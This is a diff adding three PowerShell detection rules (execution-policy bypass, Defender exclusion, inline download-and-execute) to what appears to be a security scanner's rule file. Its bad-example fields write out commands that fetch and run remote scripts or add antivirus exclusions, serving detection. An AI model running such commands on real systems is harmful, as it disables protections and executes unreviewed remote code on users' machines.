@@ -486,6 +486,42 @@ false_positive_guidance = "Legitimate uploads to known services will trigger thi
 remediation = "Verify the upload destination is trusted. Review what data is being sent."
 mitre_id = "T1048.003"
 
+[[rule]]
+id = "ps_set_execution_policy_bypass"
+title = "PowerShell ExecutionPolicy bypass"
+category = "command"
+severity_rationale = "High — disabling PowerShell's script signing enforcement is a common malware install step that allows arbitrary unsigned scripts to run in the current session or scope."
+description = "A PowerShell command sets the script execution policy to Bypass via the Set-ExecutionPolicy cmdlet (or its sep alias) or via the powershell.exe -ExecutionPolicy Bypass flag. Either form removes script signing enforcement for the affected scope."
+examples_bad = ["Set-ExecutionPolicy Bypass -Scope Process -Force", "powershell -ExecutionPolicy Bypass -Command \"iex (iwr https://example.com/install.ps1)\""]
+examples_good = ["Set-ExecutionPolicy Restricted", "Set-ExecutionPolicy AllSigned -Scope CurrentUser"]
+false_positive_guidance = "Legitimate installers occasionally relax execution policy temporarily. Review what runs immediately after — if it fetches code from the network, treat the whole sequence as one threat."
+remediation = "Avoid disabling script signing. Sign the script with a trusted certificate or use Set-ExecutionPolicy RemoteSigned at the smallest scope possible."
+mitre_id = "T1562.001"
+
+[[rule]]
+id = "ps_defender_exclusion"
+title = "Windows Defender exclusion added"
+category = "command"
+severity_rationale = "High — adding a Defender exclusion path or process disables real-time scanning for that location and is a documented evasion step used by malware to persist undetected."
+description = "A PowerShell command calls Add-MpPreference with -ExclusionPath or -ExclusionProcess, hiding files or processes in that location from Windows Defender scans."
+examples_bad = ["Add-MpPreference -ExclusionPath C:\\Users\\user\\AppData\\Local\\Temp", "Add-MpPreference -ExclusionProcess powershell.exe"]
+examples_good = ["Get-MpPreference"]
+false_positive_guidance = "Some legitimate enterprise installers add exclusions for performance reasons. Verify the path and process belong to a trusted vendor before allowing."
+remediation = "Remove the exclusion with Remove-MpPreference. Investigate any files that appeared in the excluded path during the exclusion window."
+mitre_id = "T1562.001"
+
+[[rule]]
+id = "ps_inline_download_execute"
+title = "PowerShell inline download-and-execute"
+category = "command"
+severity_rationale = "High — iex (or invoke-expression) as the leading command with a URL-containing argument means a remote payload will be fetched and run without inspection."
+description = "A PowerShell command uses iex / invoke-expression as the leading command with at least one URL argument, e.g. iex (iwr https://example.com/install.ps1). The pipe form (iwr url | iex) is handled by pipe_to_interpreter."
+examples_bad = ["iex (iwr https://example.com/install.ps1)", "Invoke-Expression (Invoke-WebRequest https://example.com/x.ps1)"]
+examples_good = ["iwr https://example.com/install.ps1 -OutFile install.ps1"]
+false_positive_guidance = "Trusted internal automation may use this pattern. Pin to a fixed URL on an allowlisted host and review the fetched script."
+remediation = "Download the script to disk, inspect it, then run it with explicit script-signing or content verification."
+mitre_id = "T1059.001"
+
 # ── Code file scan rules ────────────────────────────────────────────────
 
 [[rule]]
